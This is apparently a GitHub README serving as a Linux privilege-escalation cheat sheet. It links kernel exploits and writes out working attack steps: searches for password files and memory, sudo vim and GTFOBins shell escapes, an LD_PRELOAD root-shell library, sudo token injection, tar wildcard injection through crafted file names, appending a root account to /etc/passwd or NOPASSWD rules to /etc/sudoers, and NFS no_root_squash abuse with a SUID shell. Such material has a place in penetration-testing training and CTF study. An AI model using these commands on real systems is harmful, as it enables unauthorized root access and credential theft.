![Cover-Image](https://user-images.githubusercontent.com/95465072/214883789-1f48e8ab-9de0-4693-b0f2-94f42e433c4f.png)


# Linux Privilege Escalation 🦁

&nbsp;

## 📜 Overview


## 1 Escalation By ```Kernel Exploits```

⚡[Linux Kernel < 2.6.37-rc2 ACPI custom_method Privilege Escalation](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C0__TO___2%2C6%2C36.c)<br>
⚡[Linux Kernel - 5.8 < 5.16.11 - Local Privilege Escalation (DirtyPipe)](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel__5%2C8%2C0__TO__5%2C16%2C11.c)<br>
⚡[Linux Kernel - 2.4.20 To 2.4.27 mremap missing do_munmap return check kernel exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C4%2C20__TO__2%2C4%2C27.c)<br>
⚡[Linux Kernel - 2.4.29 uselib VMA insert race vulnerability](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C4%2C29.c)<br>
⚡[Linux Kernel < 2.6.36-rc6 pktcdvd Kernel Memory Disclosure](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C0__TO___2%2C6%2C36.c)<br>
⚡[Linux Kernel < 2.6.36.2 Econet Privilege Escalation Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel__2%2C6%2C0__TO__2%2C6%2C36.c)<br>
⚡[Linux Kernel < 2.6.11 Local integer overflow Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C5__TO__2%2C6%2C11.c)<br>
⚡[Linux Kernel - 2.6.0-2.6.16 Local Race](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C8__TO__2%2C6%2C16.c)<br>
⚡[Linux kernel < 2.6.22 open/ftruncate local exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C11__TO__2%2C6%2C22.c)<br>
⚡[Linux Kernel < 2.6.36-rc1 CAN BCM Privilege Escalation Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C18__TO__2%2C6%2C36.c)<br>
⚡[Linux Kernel - 2.6.28 To 3.7.6 _X86_MSR Exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C18__TO__3%2C7%2C6.c)<br>
⚡[Linux kernel <2.6.29 exit_notify() local root exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C25__TO__2%2C6%2C29.sh)<br>
⚡[Linux Kernel-  2.6.34 To 2.6.36 CAP_SYS_ADMIN to root exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_2%2C6%2C34__TO__2%2C6%2C36.c)<br>
⚡[Linux Kernel - 3.0 To 3.8.9 perf_swevent_init Local root exploit](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_3%2C0%2C0__TO__3%2C8%2C9.c)<br>
⚡[Linux Kernel - 3.4.0 To 3.13.1 CVE-2014-0038](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_3%2C4%2C0__TO__3%2C13%2C1.c)<br>
⚡[Linux Kernel-  3.8.0 To 3.13.1 CVE-2016-072 PP_KEY](https://github.com/sujayadkesar/Linux-Privilege-Escalation/blob/main/Kernel_EXPLOITS/kernel_3%2C8%2C0__TO__3%2C13%2C1.c)<br>





## 2] Escalation Via File permission and Passwords 🔑📂

Search For **File containing password**
```sh
grep  --color=auto  -rnw  '/'  -ie  "PASSWORD"  --color=always  2>  /dev/null 
```
```
find  .  -type  f  -exec  grep  -i  -I  "PASSWORD"  {}  /dev/null  \;
```
### OLD PASSWORDS IN /ETC/SECURITY/OPASSWD

The  `/etc/security/opasswd`  file is used also by pam_cracklib to keep the history of old passwords so that the user will not reuse them.

:warning: Treat your opasswd file like your /etc/shadow file because it will end up containing user password hashes


### LAST EDITED FILES

Files that were edited in the last 10 minutes

```
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"

```

### IN MEMORY PASSWORDS

```
strings /dev/mem -n10 | grep -i PASS

```

### FIND SENSITIVE FILES

```
$ locate password | more 
/etc/passwd
/etc/passwd-
/etc/alternatives/vncpasswd
/etc/alternatives/vncpasswd.1.gz
/etc/exim4/passwd.client
/etc/pam.d/chpasswd
/etc/pam.d/passwd
```






## 3] Escalation By  SUDO

&nbsp;
&nbsp;

### NOPASSWD

Sudo configuration might allow a user to execute some command with another user privileges without knowing the password.

```
$ sudo -l
User local_host may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

In this example the user  `local_host`  can run  `vim`  as  `root`, it is now trivial to get a shell by adding an ssh key into the root directory or by calling  `sh`.

```
sudo vim -c '!sh'
sudo -u root vim -c '!sh'
```
&nbsp;

### LD_PRELOAD AND NOPASSWD

If  `LD_PRELOAD`  is explicitly defined in the sudoers file use the following exploit code 
 copy -> save -> compile -> execute!!



```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
	unsetenv("LD_PRELOAD");
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```
 `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

Execute any binary with the LD_PRELOAD to spawn a shell :  `sudo LD_PRELOAD=/tmp/shell.so find`

&nbsp;

### DOAS

There are some alternatives to the  `sudo`  binary such as  `doas`  for OpenBSD, remember to check its configuration at  `/etc/doas.conf`

```
permit nopass local_host as root cmd vim
```
&nbsp;


### SUDO_INJECT

Using  [https://github.com/nongiach/sudo_inject](https://github.com/nongiach/sudo_inject)

```
$ sudo whatever
[sudo] password for user:    
# Press <ctrl>+c since you don't have the password.
# This creates an invalid sudo tokens.
$ sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)
# id
uid=0(root) gid=0(root) groups=0(root)
```
&nbsp;


## 4] GTFOBins

[GTFOBins](https://gtfobins.github.io/)  is a collection of scripts that can be used to bypass local security restrictions in various applications and services. These scripts leverage various features or misconfigurations in these applications to allow an attacker to run arbitrary commands with escalated privileges.

> gdb -nx -ex ‘!sh’ -ex quit  
> sudo mysql -e ‘! /bin/sh’  
> strace -o /dev/null /bin/sh  
> sudo awk ‘BEGIN {system(“/bin/sh”)}’

&nbsp;

## 5] Wildcard

By using tar with –checkpoint-action options, a specified action can be used after a checkpoint. This action could be a malicious shell script that could be used for executing arbitrary commands under the user who starts tar. “Tricking” root to use the specific options is quite easy, and that’s where the wildcard comes in handy.

```
# create file for exploitation
touch pathtofile/--checkpoint=1
touch pathtofile/--checkpoint-action=exec=sh file.sh
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script
tar cf archive.tar *
```
&nbsp;


## Writable files

List world writable files on the system.

```
find / -writable ! -user \`whoami\` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null
```
```
find / -perm -2 -type f 2>/dev/null
```
```
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### WRITABLE /ETC/PASSWD

First generate a password with one of the following commands.

```
openssl passwd -1 -salt hack hack
mkpasswd -m SHA-512 hack
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Then add the user  `hack`  and add the generated password.

```
hack:GENERATED_PASSWORD_HERE:0:0:Hack:/root:/bin/bash
```

E.g:  `hack:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hack:/root:/bin/bash`

You can now use the  `su`  command with  `hack:hack`

Alternatively you can use the following lines to add a dummy user without a password.  
WARNING: you might degrade the current security of the machine.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy

```



### WRITABLE /ETC/SUDOERS

```
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers

# use SUDO without password
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers

```
&nbsp;

## 6] NFS Root Squashing

When  **no_root_squash**  appears in  `/etc/exports`, the folder is shareable and a remote user can mount it

```
# create dir
mkdir /tmp/nfsdir  

# mount directory
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir
cd /tmp/nfsdir

# copy wanted shell
cp /bin/bash . 	

# set suid permission
chmod +s bash 	
```
